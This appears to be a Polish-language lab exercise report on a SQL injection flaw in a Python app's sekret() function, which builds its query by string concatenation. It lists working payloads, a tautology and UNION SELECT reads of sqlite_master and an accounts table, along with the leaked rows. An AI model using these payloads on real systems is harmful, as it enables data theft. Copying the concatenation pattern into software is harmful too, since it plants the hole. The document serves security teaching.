**Miejsce luki:** funkcja `sekret()`, linia 21 w `aplikacja/app.py`:

```python
zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '" + klucz + "'"
```

Klucz od użytkownika jest sklejany (`+`) wprost z treścią SQL, więc staje się częścią zapytania.

**Pięć wejść i liczba zwróconych wierszy:**

| # | Wejście (`klucz`)                                                  | Liczba wierszy   |
|---|--------------------------------------------------------------------|------------------|
| 1 | `1234`                                                             | 1                |
| 2 | `'`                                                                | 0 (błąd składni) |
| 3 | `' OR '1'='1`                                                      | 4                |
| 4 | `' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --`| 2                |
| 5 | `' UNION SELECT login, rola FROM konta --`                         | 2                |

**Komunikat błędu dla samego apostrofa:**

```
OperationalError: unrecognized token: "'''"
```

Powód: apostrof zamknął napis w zapytaniu, zostały trzy apostrofy z rzędu (`'''`) i SQLite nie rozpoznał tego jako poprawnego tokenu.

**Zapytanie po wstawieniu danych (atak "wszystkie sekrety", wejście `' OR '1'='1`):**

```sql
SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' OR '1'='1'
```

**Schemat bazy:**

- Tabele: `sekrety`, `konta`
- Druga tabela `konta` - kolumny: `login`, `rola`, `email`
- Odczytana zawartość `konta`: `admin / administrator / admin@lab7.example`, `anna / uzytkownik / anna@lab7.example`

**Jak wejście zmieniło strukturę zapytania:** apostrof zamknął ciąg znaków przeznaczony na wartość `klucz`, a dalszy tekst (`OR '1'='1`, `UNION SELECT ...`) został dołączony jako nowa logika zapytania, więc dane zmieniły samą strukturę SQL, zamiast być tylko wartością do porównania.
